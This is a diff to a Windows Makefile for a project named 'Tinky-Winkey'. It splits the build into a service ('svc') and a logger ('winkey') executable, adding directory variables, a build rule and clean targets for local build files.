@@ -2,7 +2,8 @@
 #         TINKY-WINKEY
 # ****************************
 
-NAME				= svc.exe
+SVC					= svc
+LOGGER				= winkey
 
 
 # ****************************
@@ -26,13 +27,26 @@ DONE				= $(GREEN)[DONE]$(RESET)
 # ****************************
 
 CC					= cl
-CFLAGS				= /Wall /WX /Fe
+CFLAGS				= /Wall /WX
 
 
 # ****************************
 #       BUILD FILES
 # ****************************
 
+# Source files
+SRCS_DIR			= srcs/
+SRC_SVC				= $(addprefix $(SRCS_DIR), $(SVC).c)	
+SRC_LOGGER			= $(addprefix $(SRCS_DIR), $(LOGGER).c)
+
+# Obj files
+OBJS_DIR			= objs/
+OBJ_SVC				= $(addprefix $(OBJS_DIR), $(SVC).obj)	
+OBJ_LOGGER			= $(addprefix $(OBJS_DIR), $(LOGGER).obj)
+
+# Include files
+INCS_DIR			= incs/
+INCS				= $(wildcard $(INCS_DIR)*.h)
 
 
 # ****************************
@@ -40,6 +54,21 @@ CFLAGS				= /Wall /WX /Fe
 # ****************************
 
 .PHONY: all
-all: $(NAME)
+all: $(SVC).exe $(LOGGER).exe
 
-$(NAME): 
+$(SVC).exe: $(OBJ_SVC)
+	$(CC) $(CFLAGS) -o $@
+
+$(OBJ_SVC): $(SRC_SVC)
+	$(CC) $(CFLAGS) /C -o $<
+
+
+# ****************************
+#       CLEANING
+# ****************************
+
+clean:
+	rmdir /S /Q $(OBJS_DIR)
+
+fclean: clean
+	del /Q $(SVC).EXE $(LOGGER).exe
